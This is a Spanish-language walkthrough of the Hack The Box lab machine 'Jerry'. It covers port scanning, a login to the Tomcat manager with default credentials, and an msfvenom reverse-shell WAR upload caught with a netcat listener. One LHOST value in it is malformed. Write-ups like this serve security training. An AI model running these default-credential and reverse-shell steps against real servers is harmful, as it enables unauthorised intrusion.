![Captura de pantalla -2022-05-09 09-36-58](https://user-images.githubusercontent.com/103068924/167362483-2fb9697d-8b28-490a-8f61-2a60dcf94c31.png)

# HTB-Jerry

En primer lugar, nos creamos un directorio con el nombre de la máquina desde el que trabajaremos:

    sudo mkdir Jerry
    
Ahora, mediante la función [`mkt`](../Web/Herramientas_y_Scripts/mkt.html) que tengo previamente definida en la `.zhshrc` crearemos nuestros directorios de trabajo:

    sudo mkt

Esta función está definida para crearnos cuatro directorios (`nmap`, `content`, `exploits` y `scripts`) desde los cuales poder trabajar a la hora de
realizar las máquinas de HTB.

## Fase de Reconocimiento:

Ejecutamos un `ping` y vemos como nos reporta un ttl=127, por tanto, ya sabemos que estamos frente una máquina Windows.

    ping -c 1 10.10.10.95
    
![Captura de pantalla -2022-05-09 09-41-43](https://user-images.githubusercontent.com/103068924/167363813-7dab983b-d779-40bb-9ee9-fa2098fad932.png)

Ahora vamos a ver mediante `whatweb` que más podemos ver:

    whatweb 10.10.10.95
    
![Captura de pantalla -2022-05-09 09-48-48](https://user-images.githubusercontent.com/103068924/167364415-8e3dae47-0de7-4b61-b469-d7f0dbff2539.png)

Nos reporta un erro al tratar de acceder. Por tanto, vamos a realizar mediante [`nmap`](../Herramientas_y_Scripts/Nmap.html)
una serie de escaneos para ver que puertos se encuentran abiertos, primero realizaré un escaneo básico:

    nmap -p- --open -T5 -v -n 10.10.10.95 -oG allPorts
  
`-oG` : Exportar los resultados en formato grepeable.
  
`allPorts` : Nombre del archivo. Si no existe lo creará.
  
De esta manera podremos revisar los puertos que estaban abiertos en cualquier momento.

![Captura de pantalla -2022-05-09 10-02-16](https://user-images.githubusercontent.com/103068924/167366619-2fea1b36-9776-47cd-8c0d-a516313f4c11.png)

![Captura de pantalla -2022-05-09 10-02-34](https://user-images.githubusercontent.com/103068924/167366626-008b8f13-f83a-4e1d-a74c-9e3844c33f17.png)

Como podemos ver, nos reporta que el puerto 8080 está abierto, vamos a proceder a un segundo escaneo especificando
que quereros utilizar la variable `--script http-enum` en el puerto 8080 y guardaremos los resultados en el archivo 
`targetenum`.

    sudo nmap --script http-enum -p8080 10.10.10.95 -oN targetenum 
    
![Captura de pantalla -2022-05-07 15-15-30](https://user-images.githubusercontent.com/103068924/167366694-67b211b3-0e2c-45d5-9d33-217119e4df2b.png)

![Captura de pantalla -2022-05-07 15-24-03](https://user-images.githubusercontent.com/103068924/167366815-7cda1186-3b70-4313-b7bd-cbc85727409c.png)

Vemos que en el puerto `8080` corre un servicio `http`, por tanto, vamos a intentar acceder mediante el navegador de Firefox.

![Captura de pantalla -2022-05-07 15-09-34](https://user-images.githubusercontent.com/103068924/167367405-e0c39dde-b045-4a47-996c-8585896b46e5.png)

Vemos que al intentar acceder al dominio `http://10.10.10.95` la página no termina de cargar, pero tampoco reporta ningún error. Por tanto, lo siguiente que
probaremos será especificar el puerto en el que corre el servicio, por tanto, intentamos acceder al dominio `http://10.10.10.95:8080`.

![Captura de pantalla -2022-05-07 15-11-45](https://user-images.githubusercontent.com/103068924/167368005-2fbf0775-5bb5-4ee6-ba8d-386529a1706c.png)

![Captura de pantalla -2022-05-07 15-09-34](https://user-images.githubusercontent.com/103068924/167368016-77a414e6-3ce0-4ee2-ae34-d79d955ca882.png)

## Fase de Inrusión:

Genial ya nos carga la página, vemos que se trata de la página oficial de un programa llamado `Tomcat`. Lo siguiente que vamos a probar, es tratar de
acceder al directorio `./manager/html`.

![Captura de pantalla -2022-05-07 15-17-15](https://user-images.githubusercontent.com/103068924/167369103-a8c49c92-7566-4e5a-8cc2-0077f62154ad.png)

![Captura de pantalla -2022-05-07 15-17-33](https://user-images.githubusercontent.com/103068924/167369119-303c65f3-30f4-4435-a170-a8d7ca3a8cd3.png)

Nos muestra una ventana de registro, como se trata de una máquina fácil, podemos probar con combinaciones básicas para ver si conseguimos ingresar
de manera sencilla.

![Captura de pantalla -2022-05-07 15-17-43](https://user-images.githubusercontent.com/103068924/167369536-153cffa5-e7a3-48ba-a9a7-5a6b6a9d761e.png)

Tras probar algunas combinaciones vemos que utilizando el usuario `admin` y la contraseña `admin` nos reporta este mensaje con un error de servicio 403.

![Captura de pantalla -2022-05-07 15-18-05](https://user-images.githubusercontent.com/103068924/167369705-e43f467d-4aea-4226-b0d3-2a8c5c3690b2.png)

Vemos como nos indica un ejemplo, donde nos muestra unas credenciales que se han usado para mostrar el ejemplo.

![Captura de pantalla -2022-05-07 15-20-56](https://user-images.githubusercontent.com/103068924/167369862-6c157b14-f241-4432-8fe9-d5e4707857a1.png)

Tratamos de acceder al panel anterior mediante estas credenciales a ver si nos permite registrarnos como el usuario `tomcat` y empleando la contraseña
`s3cret`.

![Captura de pantalla -2022-05-07 15-20-56](https://user-images.githubusercontent.com/103068924/167370646-06f8b867-1bbc-4920-848a-fd7e651d0a3c.png)

![Captura de pantalla -2022-05-09 10-23-23](https://user-images.githubusercontent.com/103068924/167370670-7fe63026-5173-4dce-bff7-7baeb579db9d.png)

![Captura de pantalla -2022-05-07 15-22-16](https://user-images.githubusercontent.com/103068924/167370734-2bb21a68-2dcd-4897-9047-fde8b66decbe.png)

Las credenciales funcionan y nos lleva hasta una página que parece gestionar aplicaciones. 

Tras revisar la página vemos que nos permite subir archivos, así que vamos a tratar de buscar alguna herramienta que nos permita crear una
shell inversa desde la cual poder interactuar con la máquina.

## Creación de una Reverse Shell mediante MsfVenom:

Mediante `msfvenom` podemos tratar de comprobar una gran cantidad de herramientas:

    msfvenom -l payloads

![Captura de pantalla -2022-05-07 15-25-25](https://user-images.githubusercontent.com/103068924/167371974-d9b41da2-3d47-40a1-8498-6d2f25678fc3.png)

![Captura de pantalla -2022-05-07 15-27-24](https://user-images.githubusercontent.com/103068924/167372055-941c21d6-2d55-4808-9994-391d329511a5.png)

Vamos a emplear la herramienta `jsp_shell_reverse_tcp`. Esta herramienta, especificándole nuestro host de escucha y el puerto mediante el siguiente
comando, nos creará un archivo en formato `.war` capaz de crear una shell inversa desde la máquina víctima.

![Captura de pantalla -2022-05-09 11-02-02](https://user-images.githubusercontent.com/103068924/167385544-1f78a708-b08c-4c23-b6b3-8787c0f05fd4.png)

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.14.29 LPORT=8080 -f war -o shell.war
    
![Captura de pantalla -2022-05-09 11-02-02](https://user-images.githubusercontent.com/103068924/167376951-11f44b27-79b4-4988-b325-4f8e8423ccb7.png)
    
Una vez creado nuestro archivo `shell.war` vamos a subirlo a la máquina víctima, pero antes, debemos mover nuestro archivo
al directorio `Descargas/Downloads`:

![Captura de pantalla -2022-05-07 15-32-25](https://user-images.githubusercontent.com/103068924/167373933-05569db6-7535-4e68-b2a3-ae5c0e72fb63.png)

Ahora, mediante el apartado de la página llamado `Archivo WAR a desplegar` subimos nuestro archivo `shell.war`.

![Captura de pantalla -2022-05-07 15-32-55](https://user-images.githubusercontent.com/103068924/167374610-e9b1e566-2a29-4116-bfec-33a11ae25fc6.png)

![Captura de pantalla -2022-05-07 15-33-38](https://user-images.githubusercontent.com/103068924/167374653-431287e4-5091-47b0-968a-85ec85904e40.png)

![Captura de pantalla -2022-05-07 15-34-28](https://user-images.githubusercontent.com/103068924/167374662-ab39d3f4-9253-43a4-9079-91b7a7caf281.png)

![Captura de pantalla -2022-05-07 15-34-42](https://user-images.githubusercontent.com/103068924/167374683-17d0860c-4808-40af-9788-25955448d081.png)

Recargamos la página y vemos como aparece nuestro archivo. El siguiente paso será ponerlo en escucha por el puerto `8080` mediante `nc` como se 
trata de un sistema Windows utilizaremos `rlwarp`:

    rlwrap nc -lvnp 8080

![Captura de pantalla -2022-05-09 11-07-21](https://user-images.githubusercontent.com/103068924/167385711-908c4b6b-e40d-48c2-8978-5536a0850301.png)


![Captura de pantalla -2022-05-09 11-07-30](https://user-images.githubusercontent.com/103068924/167386060-d0be171e-6afb-468c-a5c4-8699f4ffc08a.png)


Ahora, para ejecutar el archivo, simplemente nos vamos a la página y lo pulsamos.


![Captura de pantalla -2022-05-09 11-49-32](https://user-images.githubusercontent.com/103068924/167386089-4cd94622-03f5-45df-83d6-da925a2ea417.png)

Vemos como la shell se nos despliega en la terminal que tenemos en escucha con Netcat.

![Captura de pantalla -2022-05-09 11-55-16](https://user-images.githubusercontent.com/103068924/167386486-2bea3986-982e-4163-8293-4cf58fccc4f4.png)

Está máquina ya está básicamente terminada, ya que las dos flags se encuentran en el mismo archivo, el cual se encuentra en el directorio 
`C:\Users\Administrator\Desktop\flags`:

    cd /Users/Administrator/Desktop/flags
    
Vemos como dentro del directorio `flags` se encuentra el archivo `2 for the price at 1.txt`

![Captura de pantalla -2022-05-09 12-01-47](https://user-images.githubusercontent.com/103068924/167387535-4165e282-73a2-4d0a-a41a-4893cd492ef6.png)

Y finalmente, mediante `type` podemos visualizar el contenido:

![Captura de pantalla -2022-05-07 15-59-28](https://user-images.githubusercontent.com/103068924/167387517-8daf25ec-3c37-486f-8695-2894ca5daabe.png)


![Captura de pantalla -2022-05-09 09-36-58](https://user-images.githubusercontent.com/103068924/167387740-ca9ebbf6-6e75-47f5-b8e5-076a6e0eee27.png)




